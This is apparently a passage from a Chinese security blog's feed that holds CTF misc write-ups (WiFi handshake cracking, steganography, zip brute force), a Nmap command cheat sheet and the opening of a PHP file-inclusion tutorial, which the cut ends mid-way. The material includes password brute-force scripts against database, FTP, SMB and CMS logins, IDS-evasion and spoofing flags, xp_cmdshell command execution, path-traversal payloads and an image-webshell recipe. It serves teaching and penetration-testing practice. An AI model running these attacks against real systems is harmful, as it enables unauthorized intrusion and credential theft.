&gt;&gt;wifipassword.txt</p><p>学习crunch命令网站：<a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201706/541638.htm</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011546_958.png" alt=""></p><p>aircrack-ng wifi.cap -w wifipassword.txt</p><p>参数选择3 因为前两个为空</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011612_324.png" alt=""></p><p> KEY FOUND! [ 13910407686 ]</p><p>也可使用脚本写字典</p><pre><code class="c"># include&lt;stdio.h&gt;int main(){        int i,j,k,l;        FILE *fp=NULL;        fp=fopen(&quot;words.txt&quot;,&quot;w&quot;);        for(i=0;i&lt;=9;i++)    {                for(j=0;j&lt;=9;j++)        {                        for(k=0;k&lt;=9;k++)            {                                for(l=0;l&lt;=9;l++)                {                                        fprintf(fp,&quot;1391040%d%d%d%d\n&quot;,i,j,k,l);                                }                        }                }        }    fclose(fp);}</code></pre><pre><code class="python">s = &quot;1391040&quot;t = &quot;&quot;file = open(&#39;data.txt&#39;,&#39;w&#39;)for i in range(10):    for j in range(10):        for k in range(10):            for l in range(10):                t = s + str(i) + str(j) + str(k) + str(l)                file.write(t)                file.write(&#39;\n&#39;)file.close()</code></pre><h3 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h3><p>下载文件使用notepad++查看</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011716_149.png" alt=""></p><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p><p>方法二：strings brave | grep KEY</p><h3 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h3><p>把cookie修改为管理员,然后提示下载exe文件</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011722_15.png" alt=""></p><p>修改为true 得到下载地址，wireshark抓包随便填写账号密码抓包，筛选tcp流追踪一下</p><p>LOGIN下方是明显的BASE64编码，解码发现是一个163邮箱，取账+号密码，登陆后获取flag</p><p>flag{182100518+725593795416}</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041929_134.png" alt=""></p><p>binwalk查看发现隐藏文件</p><p>foremost得到rar解压需要密码</p><p>右键查看照片属性</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041931_278.png" alt=""></p><p>base64解码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041933_188.png" alt=""></p><p>得到一个照片</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041935_321.png" alt=""></p><p>试一试修改高度</p><p>得到flag<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041937_206.png" alt=""></p><p>BUGKU{a1e5aSA}</p><h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>binwalk分析隐藏压缩包，所以提取</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805041939_484.png" alt="">得到zip文件</p><p>unzip 00000079.zip</p><p>得到8张文件和一个gif</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805051138_920.png" alt=""></p><p>追一分析</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805051140_411.png" alt=""></p><p>发现88、888、8888是被修改过的图片。</p><p>1.88图片自带二维码，扫描得到  bilibili</p><p>2.888将其后缀名添加上.jpg，查看其属性，从备注中获得一个使用base64加密的密文，解密得到silisili</p><p>3.8888有个压缩包，解压得到一张二维码得到panama</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805051144_91.png" alt=""></p><p>最后根据题目提示的进行组合，得到 flag{bilibili_silisili_panama}</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片的标题图穷flag见</p><p>以及题目图穷匕见都暗示该图片在文件末尾隐藏了信息，主题会画图吗的作用下文再分析</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805020025_829.png" alt=""></p><p>winhex打开，找到jpg的文件尾FF D9，发现其后还有大量的数据</p><p>复制保存到txt中尝试将数据按16进制-&gt;ASCII方式解码，思路就很明显了，使用的是notepad++中的插件Converter进行解码HEX-&gt;ASCII</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805042005_925.png" alt=""></p><p>这时候再结合会画图吗的提示，将这些坐标做成一张图即可，</p><p>用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2</p><p>所以需要替换格式</p><p>替换</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061413_574.png" alt=""></p><p>kali安装gnuplot：sudo apt-get install gnuplot-x11 </p><p>plot “/root/Desktop/111.txt”  </p><p>但windows下是使用 plot “C:\\Users\\Asus\\Desktop\\111.txt”  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061427_357.png" alt=""></p><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>通过网址，可以看到一个convert.txt文件，文件内容为二进制</p><p>将所有的二进制串转化为十六进制串</p><p>十六进制串写入到一个rar的压缩包中,解压压缩包我们可以看到一个CTF图片: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061458_280.png" alt=""></p><p>试一试右键属性发现base64编码的一段文字 解码。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061459_512.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061500_151.png" alt=""></p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p><pre><code class="python">import binascii__author__ = &#39;Bigbroke&#39;# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord(&#39;A&#39;), ord(&#39;A&#39;) + 6)]# bin2decdef bin2dec(string_num):    return str(int(string_num, 2))# hex2decdef hex2dec(string_num):    return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num):    num = int(string_num)    mid = []    while True:        if num == 0: break        num, rem = divmod(num, 2)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num):    num = int(string_num)    mid = []    while True:        if num == 0:            break        num, rem = divmod(num, 16)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num):    return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num):    return dec2hex(bin2dec(string_num))if __name__ == &#39;__main__&#39;:    file1 = open(&#39;convert.txt&#39;)    s = file1.read()    hexx = bin2hex(s)    print (hexx)    file2 = open(&#39;4.rar&#39;, &#39;wb&#39;)    file2.write(binascii.a2b_hex(hexx))</code></pre><h3 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h3><p>通过网址，下载wav的音乐源文件：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061513_376.png" alt=""></p><p>通过Audacity软件打开音乐源文件，我们可以看到源文件中插入了一串东西：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061513_11.png" alt=""></p><p>放大观察，我们很容易想到是一串摩斯密码（短横杠代表<code>.</code>，长横杠代表<code>-</code>，中间代表空格）</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061514_267.png" alt=""></p><p>按照规律得到摩斯密码为：</p><pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><p>解密后的字符串得到flag：<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061518_97.png" alt=""></p><p>5BC925649CB0188F52E617D70929191C</p><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p> 打开记事本发现是一串0-255的数字，推测是RGB的数字表示形式。每组数据对应一个像素点，图片宽度推测503*122，撸个python脚本</p><pre><code>from PIL import Imageimport rex = 503 #x坐标  通过对txt里的行数进行整数分解y = 122 #y坐标  x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#39;misc100.txt&#39;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x):    for j in range(0,y):        line = file.readline()#获取一行        rgb = line.split(&quot;,&quot;)#分离rgb        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()</code></pre><p>flag{youc@n’tseeme}</p><h3 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061547_404.jpg" alt=""></p><p>binwalk分析</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061546_905.png" alt=""></p><p>得到一个rar文件</p><p>解码密码不知道 右键图片属性也没有 爆破也没得到</p><p>后来网上查到密码就是“喜欢我吗.”尝试一下，将文本解压出来 </p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>…./-/-/.–./—…/-..-./-..-././-./-.-./—/-.././.-.-.-/-.-./…./.-/…./..-/—/.-.-.-/-.-./—/–/-..-.</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="external">http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p>第一个电报密文很明显就是莫斯密码工具解密，得到一个网站：HTTP://ENCODE.CHAHUO.COM/ </p><p>AES加密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805061550_867.png" alt=""></p><p>momoj2j.png </p><p>那么真正网址就是<a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="external">http://c.bugku.com/momoj2j.png</a></p><p>访问后出现一个二维码，直接扫码，什么都扫不出来</p><p>反色得到flag</p><p>KEY{nitmzhen6}  </p><h3 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h3><p>下载zip，增加.zip得到25张数独的照片</p><p>确实没想到找了资料</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="external">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="external">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><p>base64编码的字符串：  Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9  经过7次解码之后就得到flag  <strong>flag：flag{y0ud1any1s1}</strong> </p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>发现一共解压出来68个zip压缩包。当我们尝试打开压缩包时，提示我们输入密码 </p><p>crc32碰撞，暴力破解得到base64 ，解码十六进制</p><ul><li>cf907300000d00000000000000aa3e7a008023004900000054000000028634abfe6b631d491d33030001000000434d54091514cbdd414f952448d3e88f984511514146f79f1d20427c6d2bb869ca9f282c3328fc4816991f1b181d8f382c4676e1c5ed674d72de4d4ad58274be92bd1f0a94cdbeaef73f22804af77420902d001d0000001d0000000262d1e7d54f631d491d30080020000000666c61672e74787400b0346966666978207468652066696c6520616e64206765742074686520666c6167c43d7b00400700a</li></ul><p>之后补上文件头后解压</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.csdn.net/xuqi7/article/details/71436020" target="_blank" rel="external">CTF—图片相关</a></p><p><a href="https://my.oschina.net/ososchina/blog/801358" target="_blank" rel="external">PNG图片文件结构分析</a></p><p><a href="https://www.anquanke.com/post/id/86211" target="_blank" rel="external">CTF比赛中关于zip的总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nmap 使用技巧汇总</title>
      <link href="/archis/40a439a4/"/>
      <url>/archis/40a439a4/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-使用技巧汇总"><a href="#Nmap-使用技巧汇总" class="headerlink" title="Nmap 使用技巧汇总"></a>Nmap 使用技巧汇总</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><pre><code>1. 全面扫描/综合扫描nmap -A 192.168.1.1032. Ping扫描nmap -sP 192.168.1.1/243. 免Ping扫描，穿透防火墙，避免被防火墙发现nmap -P0 192.168.1.1034. TCP SYN Ping 扫描nmap -PS -v 192.168.1.103nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）5. TCP ACK Ping 扫描nmap -PA -v 192.168.1.1036. UDP Ping 扫描nmap -PU -v 192.168.1.1037. ICMP Ping Types 扫描nmap -PU -v 192.168.1.103    (ICMP ECHO)nmap -PP -v 192.168.1.103    (ICMP 时间戳)nmap -PM -v 192.168.1.103    (ICMP 地址掩码)8. ARP Ping 扫描nmap -PR -v 192.168.1.1039. 列表 扫描nmap -sL -v 192.168.1.10310. 禁止方向域名解析nmap -n -sL -v 192.168.1.10311. 方向域名解析nmap -R -sL -v 192.168.1.10312. 使用系统域名解析系统nmap --system-dns 192.168.1.2 192.168.1.10313. 扫描IPV6地址nmap -6 IPv614. 路由跟踪nmap --traceroute -v www.sunbridgegroup.com15. SCTP INIT Ping 扫描nmap -PY -v 192.168.1.103</code></pre><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><pre><code>1. 时序扫描nmap -T(0-5) 192.168.1.1032. 常用扫描方式nmap -p 80 192.168.1.103nmap -p 80-100 192.168.1.103nmap -p T:80,U:445 192.168.1.103nmap -F 192.168.1.1.103    (快速扫描)nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]nmap -sS -v 192.168.1.1034. TCP 连接扫描[全连接扫描]nmap -sT -v 192.168.1.1035. UDP 连接扫描nmap -sU -p 80-100 192.168.1.1036. 隐蔽扫描nmap -sN 61.241.194.153(NULL扫描)nmap -sF 61.241.194.153(FIN扫描)nmap -sX 61.241.194.153(Xmas扫描)7. TCP ACK 扫描nmap -sA 192.168.1.1038. TCP 窗口扫描nmap -sW -v -F  192.168.1.1039. TCP Maimon 扫描nmap -sM -T4  192.168.1.10310. 自定义 扫描nmap -sT --scanflags SYNURG 192.168.1.10311. 空闲 扫描( 隐藏IP )nmap -sI www.0day.co:80 192.168.1.10312. IP协议 扫描nmap -sO -T4 192.168.1.10313. FTP Bounce 扫描(已经不被支持)</code></pre><h2 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a>三、指纹识别与探测</h2><pre><code>1. 版本探测（显示banner信息）nmap -sV 192.168.1.103nmap -sV -A 192.168.1.1032. 全端口版本探测nmap -sV --allports 192.168.1.1033. 设置扫描强度nmap -sV --version-intensity (0-9) 192.168.1.1034. 轻量级扫描nmap -sV --version-light 2 192.168.1.1035. 重量级扫描nmap -sV --version-all 192.168.1.1036. 获取详细版本信息nmap -sV --version-trace 192.168.1.1037. RPC扫描nmap -sS -sR 192.168.1.1038. 对指定的目标进行操作系统监测nmap -O --osscan-limit 192.168.1.1039. 推测系统并识别nmap -O --osscan-guess 192.168.1.103</code></pre><h2 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a>四、伺机而动</h2><pre><code>1. 调整并行扫描组的大小nmap --min-hostgroup 30 192.168.1.110/24nmap --max-hostgroup 30 902 192.168.1.1042. 调整探测报文的并行度nmap --min-parallelism 100 192.168.1.104nmap --max-parallelism 100 192.168.1.1043. 调整探测报文超时nmap --initial-rtt-timeout 100ms 192.168.1.104nmap --max-rtt-timeout 100ms 192.168.1.104nmap --min-rtt-timeout 100ms 192.168.1.1044. 放弃缓慢的目标主机nmap --host-timeout 1800000ms 192.168.1.1045. 调整报文适合时间间隔nmap --scan-delay 1s 192.168.1.104nmap --max-scan-delay 1s 192.168.1.104</code></pre><h2 id="五、防火墙-IDS逃逸"><a href="#五、防火墙-IDS逃逸" class="headerlink" title="五、防火墙/IDS逃逸"></a>五、防火墙/IDS逃逸</h2><pre><code>1. 报文分段nmap -f -v 61.241.194.1532. 指定偏移大小nmap --mtu 16 192.168.1.1043. IP欺骗nmap -D RND:11 192.168.1.104nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.1044. 源地址欺骗nmap -sI www.0day.cn:80 192.168.1.1045. 源端口欺骗nmap --source-port 902 192.168.1.1046. 指定发包长度nmap --data-length 30 192.168.1.1047. 目标主机随机排序nmap --randomize-hosts 192.168.1.1048. MAX地址欺骗nmap -sT -Pn --spoof-mac 0 192.168.1.104</code></pre><h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><pre><code>1. IP信息收集nmap --script ip-geolocation-* www.pcos.cn2. WHOIS 查询nmap --script whois-domain www.pcos.cnnmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.comnmap -sn --script whois-domain -v -iL host.txt3. 搜索邮件信息(新版可能没有这个模块)nmap --script http-email-harvest www.pcos.cn4. IP反查nmap -sn --script hostmap-ip2hosts www.pcos.cn5. DNS信息收集nmap --script dns-brute www.pcos.cnnmap --script dns-brute dns-brute.threads=10 www.pcos.cnnmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn6. 检索系统信息nmap -p 445 445 192.168.1.104 --script membase-http-info7. 后台打印机服务漏洞nmap --script smb-security-mode.nse -p 445 119.29.155.458. 系统漏洞扫描nmap --script smb-check-vulns.nse -p 445 119.29.155.459.扫描Web漏洞nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.4510. 通过 Snmp 列举 Windows 服务/账户nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.11011. 枚举 DNS 服务器的主机名nmap --script dns-brute --script-args dns-brute.domain=baidu.com12. HTTP信息收集nmap -sV -p 80 www.0day.com (HTTP版本探测)nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)13. 枚举SSL密钥nmap -p 443 --script=ssl-enum-ciphers www.baidu.com14. SSH服务密钥信息探测map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</code></pre><h2 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a>七、数据库渗透测试</h2><pre><code>1. Mysql列举数据库nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.1012. 列举 MySQL 变量nmap -p3306 --script=mysql-variables 192.168.1.3nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)3. 检查 MySQL 密码nmap -p3306 --script=mysql-empty-password 192.168.1.3nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.34. 审计 MySQL 密码nmap --script=mysql-brute 192.168.1.101nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)5. 审计 MySQL 安全配置nmap -p3306 --script mysql-audit --script-args &quot;mysql-audit.username=&#39;root&#39;,mysql-audit.password=&#39;123&#39;,mysql-audit.filename=&#39;nselib/data/mysql-cis.audit&#39;&quot; 192.168.1.1046. 审计 Oracle 密码nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.1057. 审计 msSQL密码nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.1048. 检查 msSQL空密码nmap -p 1433 --script ms-sql-empty-password 192.168.1.1049. 读取 msSQL 数据nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.10110. 读取 msSQL 执行系统命令nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;ipconfig&quot; 192.168.1.10111. 审计 PgSQL 密码nmap -p 5432 --script pgsql-brute 192.168.1.101</code></pre><h2 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a>八、渗透测试</h2><pre><code>1. 审计 HTTP 身份验证nmap --script=http-brute -p 80 www.pcos.cn2. 审计 FTP 服务器nmap --script ftp-brute -p 21 192.168.1.101nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101nmap --script=ftp-anon 192.168.1.1013. 审计 Wordpress 程序nmap -p80 --script http-wordpress-brute 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.1104. 审计 Joomla 程序nmap -p80 --script http-joomla-brute 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.1105. 审计 邮件服务器 nmap -p110 --script=pop3-brute 192.168.1.1106. 审计 SMB 口令nmap --script smb-brute.nse -p 445 192.168.1.110nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.1107. 审计 VNC 服务nmap --script vnc-brute -p 5900 192.168.1.1108. 审计 SMTP 服务器nmap -p 25 --script smtp-brute 192.168.1.110nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)9. 检测 Stuxnet 蠕虫nmap --script stuxnet-detect -p 445 192.168.1.11010. SNMP 服务安全审计nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)nmap -sU -p 161 --script snmp-brute 192.168.1.110</code></pre><h2 id="九、Zenmap"><a href="#九、Zenmap" class="headerlink" title="九、Zenmap"></a>九、Zenmap</h2><pre><code>1. Intense scan (详细扫描)nmap -T4 -A -v 192.168.1.1012. Intense scan plus UDP (UDP扫描经典使用)nmap -sS -sU -T4 -A -v 192.168.1.1013. Intense scan, all TCP ports (TCP扫描)nmap -p 1-65535 -T4 -A -v 192.168.1.1014. Intense scan, no ping (无Ping扫描)nmap -T4 -A -v -Pn 192.168.1.1015. Ping scan (Ping扫描)nmap -sn 192.168.1.101/246. Quick scannmap -T4 -F 192.168.1.101/247. Quick scan plusnmap -sV -T4 -O -F --version-light 192.168.1.101/248. Quick traceroutenmap -sn --traceroute 192.168.1.1019. Regular scan nmap 192.168.1.10110. Slow comprehensive scannmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; 192.168.1.101</code></pre><h2 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a>十. Nmap 技巧</h2><pre><code>1. 发送以太网数据包nmap --send-eth 192.168.1.1112. 网络层发送nmap --send-ip 192.168.1.1113. 假定拥有所有权nmap --privileged 192.168.1.1114. 在交互模式中启动nmap --interactive5. 查看 Nmap 版本号nmap -V6. 设置调试级别nmap -d (1-9) 192.168.1.1117. 跟踪发送接收的报文nmap --packet-trace -p 20-30 192.168.1.1118. 列举接口和路由nmap --iflist www.iteye.com9. 指定网络接口nmap -e eth0 192.168.1.11110. 继续中断扫描nmap -oG 1.txt -v 192.168.126.1/24nmap --resume 1.txt (继续扫描)11. Dnmapdnmap_server -f test (指定命令脚本)dnmap_client -s 192.168.1.107 -a test12. 编写 Nse 脚本    (1)    -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        portrule = function(host,port)            return port.protocol == &quot;tcp&quot; and port.number == 80 and port.state == &quot;open&quot;        end        action = function(host,port)            return &quot;Found!!!&quot;        end    (2) -- The scanning module --        author = &quot;Wing&quot;        categories = {&quot;version&quot;}        local comm=require &quot;comm&quot;        require &quot;shortport&quot;        local http=require &quot;http&quot;        portrule = function(host,port)            return (port.number == 80) and (port.start==&quot;open&quot;)        end        action = function(host,port)            local uri = &quot;/admin.php&quot;            local response = http.get(host,port,uri)            return &quot;Found!!!&quot;        end13. 探测防火墙nmap --script=firewalk --traceroute 192.168.1.11114. VMware认证破解nmap -p 902 --script vmauthd-brute 192.168.1.107</code></pre><h2 id="十一-Nmap的保存和输出"><a href="#十一-Nmap的保存和输出" class="headerlink" title="十一. Nmap的保存和输出"></a>十一. Nmap的保存和输出</h2><pre><code>1. 标准保存nmap -F -oN d:/test1.txt 192.168.1.1112. XML保存nmap -F -oX d:/test1.xml 192.168.1.1113. 133t 保存nmap -F -oS d:/test2.txt 192.168.1.1114. Grep 保存nmap -F -oG d:/test2.txt 192.168.1.1115. 保存到所有格式nmap -F -oA d:/test2 192.168.1.1116. 补充保存文件nmap -F -append-output -oN d:/test2.txt 192.168.1.1117. 转换 XML 保存nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.1118. 忽略 XML 声明的 XSL 样式表nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php文件包含漏洞</title>
      <link href="/archis/844a29d4/"/>
      <url>/archis/844a29d4/</url>
      
        <content type="html"><![CDATA[<p>   文章首发于<a href="https://cloud.tencent.com/developer/article/1180857" target="_blank" rel="external">信安之路</a>,转载请注明来源</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>php中引发文件包含漏洞的通常是以下四个函数：</p><ol><li><a href="http://www.php.net/manual/en/function.include.php" target="_blank" rel="external">include()</a>   当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li><li><a href="http://php.net/manual/en/function.include-once.php" target="_blank" rel="external">include_once()</a>   功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</li><li><a href="http://php.net/manual/en/function.require.php" target="_blank" rel="external">require()</a>  只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li><li><a href="http://php.net/manual/en/function.require-once.php" target="_blank" rel="external">require_once()</a> 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ol><p>当使用这四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。这一特性，在实施攻击时非常有用。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>(1)include等函数通过动态执行变量的方式引入需要包含的文件；</p><p>(2)用户能控制该动态变量。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启 了我们就有可能包含远程文件。</p><p>1、本地文件包含LFI(Local File Include)</p><p> 2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on  allow_url_fopen = On）</p><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h2 id="一、本地包含"><a href="#一、本地包含" class="headerlink" title="一、本地包含"></a>一、本地包含</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><p>?file=test.txt</p><h3 id="目录遍历："><a href="#目录遍历：" class="headerlink" title="目录遍历："></a>目录遍历：</h3><p>?file=./../../test.txt<br>./当前目录,../上一级目录,这样的遍历目录来读取文件</p><h3 id="包含图片木马"><a href="#包含图片木马" class="headerlink" title="包含图片木马"></a>包含图片木马</h3><p>命令行下执行：<code>copy x.jpg /b + s.php /b f.jpg</code></p><p>上传 f.jpg</p><p>找到 f.jpg 路径</p><p>包含 f.jpg</p><h3 id="包含日志"><a href="#包含日志" 